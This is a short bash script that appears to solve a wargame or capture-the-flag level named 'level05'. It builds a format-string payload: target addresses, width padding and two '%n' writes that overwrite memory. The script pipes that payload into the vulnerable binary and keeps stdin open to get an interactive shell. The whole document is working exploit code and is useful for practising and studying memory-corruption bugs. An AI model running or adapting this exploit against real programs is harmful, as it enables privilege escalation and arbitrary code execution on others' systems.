#!/usr/bin/env bash

. /tmp/init.sh

python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55428x" + "%10$n" + "%10099x" + "%11$n"' > /tmp/level05

cat /tmp/level05 - | ./level05
